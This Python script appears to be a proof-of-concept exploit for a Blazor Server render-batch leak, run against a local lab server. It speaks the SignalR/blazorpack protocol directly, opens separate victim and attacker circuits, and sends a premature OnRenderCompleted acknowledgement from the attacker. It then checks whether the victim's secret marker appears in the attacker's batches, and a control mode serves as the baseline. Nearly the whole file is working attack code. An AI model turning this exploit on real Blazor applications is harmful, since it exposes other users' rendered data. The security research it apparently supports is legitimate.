import json
import re
import socket
import sys
import time
import urllib.parse
import urllib.request
import websocket
import msgpack

BASE = "http://127.0.0.1:5019"
CONTROL = len(sys.argv) > 1 and sys.argv[1] == "control"
MARKER = re.compile(rb"CIRCUIT-[0-9a-f]{32}")

def http_json(path, data=None):
    req = urllib.request.Request(BASE + path, data=data, method="POST" if data is not None else "GET")
    return json.load(urllib.request.urlopen(req, timeout=5))

def frame(obj):
    packed = msgpack.packb(obj, use_bin_type=True)
    n = len(packed)
    prefix = bytearray()
    while n >= 0x80:
        prefix.append((n & 0x7f) | 0x80)
        n >>= 7
    prefix.append(n)
    return bytes(prefix) + packed

def parse(data):
    out = []
    i = 0
    while i < len(data):
        n = 0
        shift = 0
        while True:
            b = data[i]
            i += 1
            n |= (b & 0x7f) << shift
            shift += 7
            if not b & 0x80:
                break
        out.append(msgpack.unpackb(data[i:i+n], raw=False))
        i += n
    return out

def messages(ws):
    opcode, data = ws.recv_data()
    if opcode == websocket.ABNF.OPCODE_BINARY:
        return parse(data)
    return []

def send(ws, target, args, invocation_id=None):
    ws.send(frame([1, {}, invocation_id, target, args, []]), opcode=websocket.ABNF.OPCODE_BINARY)

def open_circuit(role):
    path = "/probe/" + role
    html = urllib.request.urlopen(BASE + path, timeout=5).read().decode()
    markers = [json.loads(x) for x in re.findall(r"<!--Blazor:(\{.*?\})-->", html)]
    records = json.dumps([x for x in markers if x.get("type") == "server"], separators=(",", ":"))
    assert records != "[]"
    negotiation = http_json("/_blazor/negotiate?negotiateVersion=1", b"")
    token = urllib.parse.quote(negotiation["connectionToken"], safe="")
    ws = websocket.create_connection("ws://127.0.0.1:5019/_blazor?id=" + token, timeout=15,
        sockopt=[(socket.SOL_SOCKET, socket.SO_RCVBUF, 16384)])
    ws.send('{"protocol":"blazorpack","version":2}\x1e', opcode=websocket.ABNF.OPCODE_TEXT)
    assert ws.recv() == b"{}\x1e"
    send(ws, "StartCircuit", [BASE + "/", BASE + path, records, ""], "1")
    initial = None
    completion = False
    for _ in range(12):
        for m in messages(ws):
            if m[0] == 1 and m[3] == "JS.RenderBatch":
                initial = (m[4][0], m[4][1])
            elif m[0] == 3 and m[2] == "1":
                completion = True
        if initial and completion:
            break
    assert initial and completion
    marker = MARKER.search(initial[1])
    assert marker
    print(role.upper(), "CONNECTION", negotiation["connectionId"], "INITIAL_ID", initial[0], "INITIAL_BYTES", len(initial[1]), "MARKER_SHA1_8", __import__("hashlib").sha1(marker.group()).hexdigest()[:8], flush=True)
    return ws, negotiation["connectionId"], initial[0], marker.group()

def wait_ids(connection, needed, timeout=8):
    deadline = time.time() + timeout
    latest = None
    while time.time() < deadline:
        rows = http_json("/lab/state")
        latest = next((x["ids"] for x in rows if x["connectionId"] == connection), None)
        if latest and max(latest) >= needed:
            return latest
        time.sleep(.05)
    raise RuntimeError("timed out waiting for batches; latest=" + repr(latest))

victim, victim_conn, victim_initial, victim_marker = open_circuit("victim")
attacker, attacker_conn, attacker_initial, attacker_marker = open_circuit("attacker")
assert victim_marker != attacker_marker
send(victim, "OnRenderCompleted", [victim_initial, None])
send(attacker, "OnRenderCompleted", [attacker_initial, None])
print("INITIAL_ACKS_SENT", flush=True)

ids = wait_ids(attacker_conn, attacker_initial + 10)
attacker_row = next(x for x in http_json("/lab/state") if x["connectionId"] == attacker_conn)
print("ATTACKER_PENDING_IDS", ids, "SIZES", attacker_row["sizes"], flush=True)
early_id = max(ids)
if not CONTROL:
    send(attacker, "OnRenderCompleted", [early_id, None])
    print("EARLY_ACK_SENT", early_id, flush=True)
else:
    print("EARLY_ACK_SKIPPED", flush=True)
for _ in range(8):
    http_json("/lab/trigger-victim", b"")
    time.sleep(.08)
victim_ids = wait_ids(victim_conn, victim_initial + 8)
victim_row = next(x for x in http_json("/lab/state") if x["connectionId"] == victim_conn)
overlap = set(attacker_row["hashes"]) & set(victim_row["hashes"])
print("VICTIM_PENDING_IDS", victim_ids, "BUFFER_HASH_OVERLAP", sorted(overlap), flush=True)

victim_batches = []
for _ in range(30):
    for m in messages(victim):
        if m[0] == 1 and m[3] == "JS.RenderBatch" and m[4][0] > victim_initial:
            victim_batches.append((m[4][0], len(m[4][1]), victim_marker in m[4][1]))
    if len(victim_batches) >= 8:
        break
print("VICTIM_BATCHES", victim_batches, flush=True)

seen = []
leaked = False
attacker.settimeout(25)
for _ in range(40):
    for m in messages(attacker):
        if m[0] == 1 and m[3] == "JS.RenderBatch":
            batch_id, payload = m[4]
            victim_hit = victim_marker in payload
            own_hit = attacker_marker in payload
            seen.append((batch_id, len(payload), victim_hit, own_hit))
            print("ATTACKER_BATCH", batch_id, "BYTES", len(payload), "VICTIM_MARKER", victim_hit,
                  "OWN_MARKER", own_hit, flush=True)
            leaked |= victim_hit
    if any(x[0] >= early_id for x in seen):
        break
print("WIRE_LEAK", leaked, "SEEN", seen, flush=True)
attacker.close()
victim.close()
if CONTROL:
    if leaked or overlap:
        raise SystemExit(3)
else:
    if not leaked or not overlap:
        raise SystemExit(2)
